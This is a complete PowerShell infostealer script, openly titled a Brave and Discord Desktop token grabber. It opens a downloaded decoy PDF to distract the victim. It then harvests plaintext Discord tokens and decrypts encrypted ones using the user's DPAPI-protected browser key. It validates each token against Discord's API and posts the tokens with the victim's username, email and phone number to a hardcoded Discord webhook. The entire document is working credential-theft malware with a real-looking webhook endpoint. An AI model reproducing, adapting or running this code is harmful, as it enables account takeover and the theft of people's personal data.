# ── payload.ps1 — Brave + Discord Desktop token grabber ──

$whId = "1503220312618176534"
$whToken = "eM4F7p4FH7OJUSLxMk6cfpwTscDAlRdUhh74SzbPoOe9D2q-x5-Gz9cdAQNnblnaKAhd"
$webhook = "https://discord.com/api/webhooks/$whId/$whToken"
$regex = [regex]'[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,38}'
$found = @{}  # key=token, value=source string

# ── Decoy PDF ──
try {
    $pdf = "$env:TEMP\statement.pdf"
    (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/hmm495/notes/main/statement.pdf', $pdf)
    Start-Process $pdf
} catch {}

# ── Pure PowerShell AES-CTR (GCM counter mode, no C# needed) ──
function Decrypt-AesCtr {
    param([byte[]]$Key, [byte[]]$Nonce, [byte[]]$Ciphertext, [int]$StartCounter = 2)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.KeySize = 256
    $aes.Key = $Key
    $enc = $aes.CreateEncryptor()
    $counter = New-Object byte[] 16
    [Array]::Copy($Nonce, 0, $counter, 0, 12)
    $blockNum = $StartCounter
    $result = New-Object byte[] $Ciphertext.Length
    for ($offset = 0; $offset -lt $Ciphertext.Length; $offset += 16) {
        $counter[12] = [byte](($blockNum -shr 24) -band 0xFF)
        $counter[13] = [byte](($blockNum -shr 16) -band 0xFF)
        $counter[14] = [byte](($blockNum -shr 8) -band 0xFF)
        $counter[15] = [byte]($blockNum -band 0xFF)
        $keystream = $enc.TransformFinalBlock($counter, 0, 16)
        $blockSize = [Math]::Min(16, $Ciphertext.Length - $offset)
        for ($i = 0; $i -lt $blockSize; $i++) { $result[$offset + $i] = $Ciphertext[$offset + $i] -bxor $keystream[$i] }
        $blockNum++
    }
    $aes.Dispose()
    return $result
}

# ── Scan LevelDB for plaintext tokens ──
function Scan-Plaintext {
    param($paths, $source = "Unknown")
    foreach ($p in $paths) {
        if (-not (Test-Path $p)) { continue }
        Get-ChildItem "$p\*.ldb", "$p\*.log" -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                if (-not $c) { return }
                $m = $regex.Match($c)
                if ($m.Success) { $found[$m.Value] = $source }
            } catch {}
        }
    }
}

# ── Scan LevelDB for encrypted Discord tokens ──
function Scan-Encrypted {
    param($basePath)
    $statePath = "$basePath\Local State"
    $ldbPath = "$basePath\Local Storage\leveldb"
    if (-not (Test-Path $statePath) -or -not (Test-Path $ldbPath)) { return }
    try {
        $state = Get-Content $statePath -Raw | ConvertFrom-Json
        $ek = $state.os_crypt.encrypted_key
        if (-not $ek) { return }
        $ekb = [Convert]::FromBase64String($ek)
        if ($ekb.Length -le 5) { return }
        $ekb = $ekb[5..($ekb.Length-1)]  # strip "DPAPI"
        Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
        $mk = [System.Security.Cryptography.ProtectedData]::Unprotect($ekb, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        if (-not $mk -or $mk.Length -ne 32) { return }
        
        Get-ChildItem "$ldbPath\*.ldb", "$ldbPath\*.log" -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue; if (-not $c) { return }
                $idx = $c.IndexOf('dQw4w9WgXcQ:')
                while ($idx -ge 0) {
                    $s = $idx + 12
                    $e = $c.IndexOf('"', $s); if ($e -lt 0) { $e = $c.IndexOf("`n", $s); if ($e -lt 0) { $e = $s + 2000 } }
                    $b64 = $c.Substring($s, $e - $s).Trim()
                    if ($b64.Length -gt 20) {
                        try {
                            $pb = [Convert]::FromBase64String($b64)
                            if ($pb.Length -ge 28) {
                                $iv = $pb[3..14]; $ct = $pb[15..($pb.Length-17)]
                                $dec = Decrypt-AesCtr -Key $mk -Nonce $iv -Ciphertext $ct
                                $t = [Text.Encoding]::UTF8.GetString($dec).TrimEnd("`0")
                                if ($t -match $regex) {
                                    $found[$t] = "Discord Desktop"
                                    Write-Host "[Discord Desktop] Decrypted token: $($t.Substring(0,[Math]::Min(30,$t.Length)))..." -ForegroundColor Green
                                }
                            }
                        } catch {}
                    }
                    $idx = $c.IndexOf('dQw4w9WgXcQ:', $e)
                }
            } catch {}
        }
    } catch {}
}

# ── Scan all paths ──
# Brave
Scan-Plaintext -Paths @("$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb") -Source "Brave"

# Discord Desktop plaintext
$discordBases = @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:APPDATA\discorddevelopment")
$discordLdb = $discordBases | ForEach-Object { "$_\Local Storage\leveldb" }
Scan-Plaintext -Paths $discordLdb -Source "Discord Plaintext"

# Discord Desktop encrypted
foreach ($base in $discordBases) { Scan-Encrypted $base }

# ── Validate + send ──
$sent = @{}
foreach ($token in $found.Keys) {
    if ($sent[$token]) { continue }; $sent[$token] = $true
    try {
        $req = [System.Net.WebRequest]::Create("https://discord.com/api/v9/users/@me")
        $req.Headers.Add("Authorization", $token); $req.Timeout = 3000
        $resp = $req.GetResponse()
        if ($resp.StatusCode -eq 'OK') {
            $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
            $u = $reader.ReadToEnd() | ConvertFrom-Json; $reader.Close(); $resp.Close()
            $src = $found[$token]
            $msg = @{content = "**Token** ||$token||`n**Source:** $src`nUser: $($u.username)`nID: $($u.id)`nEmail: $($u.email)`nPhone: $($u.phone)"} | ConvertTo-Json
            Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json" -ErrorAction SilentlyContinue
            Write-Host "    Sent!" -ForegroundColor Green
        }
    } catch {}
}